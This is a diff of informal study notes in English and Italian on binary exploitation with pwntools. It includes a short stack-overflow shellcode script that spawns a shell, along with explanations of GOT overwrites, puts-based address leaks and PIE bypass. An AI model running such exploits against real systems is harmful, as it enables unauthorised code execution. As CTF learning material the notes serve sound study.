@@ -215,7 +215,7 @@ Now that we have a connection between the process and the python script we can u
     ```python
     p.send(data)              #sends data to the process (as if writing a string in terminal)    
     p.sendline(line)          #sends data plus a newline to the process (as if writing a string in terminal)  
-    p.sendlineafter("_str_", line)      #sends data to the process (as if writing a string in terminal) only after reading a string specified by _str_
+    p.sendlineafter("_str_", line)      #sends data to the process (as if writing a string in terminal) only after reading a string specified by _str_ 
     ```
      > ***PLEASE NOTE:*** We can send the data to the process packed as bytes using the syntax ```b'string'``` (or with ```("string").encode('ascii')```) instead of strings, since sometimes there can be some problems with them. 
 - To receive data
@@ -277,21 +277,156 @@ Some usefull stuff we can do is:
 > ```
 > Then you can search for the most suitable between the choices in the print (please make sure to look at the correct architecture and at the bytes needed for the shellcode).
 
+```
+from pwn import *
+
+context.binary = ELF('./vuln')
+
+p = process()
+
+payload = asm(shellcraft.sh())          # The shellcode
+payload = payload.ljust(312, b'A')      # Padding
+payload += p32(0xffffcfb4)              # Address of the Shellcode
+
+p.sendline(payload)
+
+p.interactive()
+```
 
 
 ```
+GOT thing that allows a c program to call libc libraries and sereve as a jumping point for the porgram (we can try to hijack it especially if aslr is enabled because there things stay constant). if we modify the jumping point we can make the program execute code at a different address than intended.
+to extract the got address (offset in the table) of a function (of the porgram) we can use radare2:
+in particular (after aaaa and r2 opening even without write mode), do a afl 
+1st address of the function (to know the new function where we want to jump where it is)
+2nd colomn: The number of basic blocks in the function
+3rd column: The size of the function (in bytes)
+4th column: The function's name
+now we use the 
+pd n @ offset: Print n opcodes/instruction forward disassembled, where n is the number of basic blocks in the funcion and offset is the function that we're gonna modify with the function we want to.          (same as doing pdf @ offset)
+the relocated address is given by the address at the end after the jmp to the ()word of relocation.
+
+
+So what is all of this nonsense about? Well, there’s two types of binaries on any system: statically linked and dynamically linked. Statically linked binaries are self-contained, containing all of the code necessary for them to run within the single file, and do not depend on any external libraries. Dynamically linked binaries (which are the default when you run gcc and most other compilers) do not include a lot of functions, but rely on system libraries to provide a portion of the functionality. For example, when your binary uses printf to print some data, the actual implementation of printf is part of the system C library.
+In order to locate these functions, your program needs to know the address of printf to call it. While this could be written into the raw binary at compile time, there’s some problems with that strategy:
+
+    Each time the library changes, the addresses of the functions within the library change, when libc is upgraded, you’d need to rebuild every binary on your system. While this might appeal to Gentoo users, the rest of us would find it an upgrade challenge to replace every binary every time libc received an update.
+    
+    Modern systems using ASLR load libraries at different locations on each program invocation. Hardcoding addresses would render this impossible.
+
+Consequently, a strategy was developed to allow looking up all of these addresses when the program was run and providing a mechanism to call these functions from libraries. This is known as relocation, and the hard work of doing this at runtime is performed by the linker (actually run before any code)
+
+.got
+    This is the GOT, or Global Offset Table. This is the actual table of offsets as filled in by the linker for external symbols.
+.plt
+    This is the PLT, or Procedure Linkage Table. These are stubs that look up the addresses in the .got.plt section, and either jump to the right address, or trigger the code in the linker to look up the address. (If the address has not been filled in to .got.plt yet.)
+    
+On the other hand, the .got.plt section is basically a giant array of function pointers! Maybe we could overwrite one of these and control execution from there. Essentially, any memory corruption primitive that will let you write to an arbitrary (attacker-controlled) address will allow you to overwrite a GOT entry.
+or you can use*****
+
+
+Every library function used by the program
+has an entry there that contains an address where the real function is located.
+This is done to allow easy relocation of libraries within the process memory
+instead of using hardcoded addresses. Before the program has used the
+function the first time the entry contains an address of the run-time-linker
+(rtl). If the function is called by the program the control is passed to the rtl
+and the functions real address is resolved and inserted into the GOT. Every
+call to that function passes the control directly to it and the rtl is not called
+anymore for this function. 
+
+By overwriting a GOT entry for a function the program will use after
+the format string vulnerability has been exploited we can seize control and
+can jump to any executeable address. This unfortunately means that any
+stack based protections, which perform checks on the return address will
+fail.
+The big advantage we gain from overwriting a GOT entry is its indepen-
+dance to environment variables (such as the stack) and dynamic memory
+allocation (heap). The address of a GOT entry is only fixed per binary, so
+if two systems have the same binary running, then the GOT entry is always
+at the same address.
+
+
+PIE is a precondition to enable address space layout randomization (ASLR). ASLR is a security feature where the kernel loads the binary and dependencies into a random location of virtual memory each time it's run.
+
+
+*****
+ou can see where the GOT entry for a function is by running:
+objdump --dynamic-reloc ./name_of_the_file
+The address of the real function (or the rtl linking function) is directly
+at the printed address.
+
+
+
+per logging and context guarda il segnalibro quello del rop pwntools
+
+Many settings in pwntools are controlled via the global variable context, such as the selected target operating system, architecture, and bit-width.
+
+In general, exploits will start with something like:
+
+from pwn import *
+context.arch = 'amd64'
+
+Which sets up everything in the exploit for exploiting a 64-bit Intel binary.
+
+The recommended method is to use context.binary to automagically set all of the appropriate values.
+
+from pwn import *
+context.binary = './challenge-binary'       Absorb settings from an ELF file
+
+context.binary is an ELF object (e.g. is the elf of the binary given before, so elf = context.binary is just like name_of_elf_object = ELF('path/name_of_the_program') but it actually makes a copy of binary)
+
+process parameter can have context.binary.path  (we need os for this) instead of ./name
+In order for the shellcode to be correct, we're going to set context.binary to our binary; this grabs stuff like the arch, OS and bits and enables pwntools to provide us with working shellcode.
+We can use just process() because once context.binary is set it is assumed to use that process
+
+Now we want to send a payload that leaks the real address of puts. As mentioned before, calling the PLT entry of a function is the same as calling the function itself; if we point the parameter to the GOT entry, it'll print out it's actual location. This is because in C string arguments for functions actually take a pointer to where the string can be found, so pointing it to the GOT entry (which we know the location of) will print it out.
+
+
+puts_got = elf.got['puts']is the address of the relocation (i.e. is the same as looking for the relocation address in pd .... with radare2) while we can use elf.symbols to get the address of the function that we want to call instead of the puts
+
+
+Manipulating integers
+
+    pack(int) - Sends a word-size packed integer
+    unpack() - Receives and unpacks a word-size integer
+
+PIE 
+the base address of ELF files i.e name_elf_file.address     Simply setting elf.address will automatically update all the function and symbols addresses for you,
+
+
+PIE stands for Position Independent Executable, which means that every time you run the file it gets loaded into a different memory address. This means you cannot hardcode values such as function addresses and gadget locations without finding out where they are.
+PIE executables are based around relative rather than absolute addresses, meaning that while the locations in memory are fairly random the offsets between different parts of the binary remain constant. For example, if you know that the function main is located 0x128 bytes in memory after the base address of the binary, and you somehow find the location of main, you can simply subtract 0x128 from this to get the base address and from the addresses of everything else.
+Due to the way PIE randomisation works, the base address of a PIE executable will always end in the hexadecimal characters 000. This is because pages are the things being randomised in memory, which have a standard size of 0x1000
+
+So, all we need to do is find a single address and PIE is bypassed. 
+if PIE is active it means the .symbols won't recover the correct address so we have to find it with:
+we can do that with main:
+main = io.unpack() where io is the instance of the process
+elf.symbols['main'] 
+so the base address of ELF is actually (to update all symbols) name_elf_file.address = main - elf.symbols['main'] 
+then now that we have the correct address of all symbols we can do as before and find theelf.got ['function_we_want_to_change']  and wld.symbols['function we want to have']
+then we pack it as io.pack(...) io.pacK(...) and then enjoy the shell
+```
+
+
+
+
+```
+
 ROP?? Vedi segnalibro + roba stack a parte 
 (secondo me metterei anche la robe della shell qui tipo)
 
 ASM SMALL GUIDE ???
 
+La funzione gets() acquisisce una stringa da tastiera, fino alla fine, compresi eventuali spazi e il ritorno a capo che trasforma nel carattere terminatore (\0). La funzione puts() visualizza l'intera riga di testo, ad esempio una stringa inserita da tastiera, compreso il ritorno a capo
+
 GDB 
 python code included in gbd
  r < $(python -c "print('A'*50)")   /da come input il risultato dello script
  
-  +PWNTOOLS DI TRINCAW
- 
- asm(shellcraft.sh())                                          /crea una shell 
+ +PWNTOOLS DI TRINCAW
+  asm(shellcraft.sh())                                          /crea una shell 
  offset = cyclic_find("kaaa")                                  /ritorna la distanza della stringa kaaa sul cyclic
  c.binary.got["exit"]                                          /ottiene l'indirizzo della funzione exit in got
  c.binary.functions["win"].address                             /ottiene l'indirizzo di un metodo all'interno del
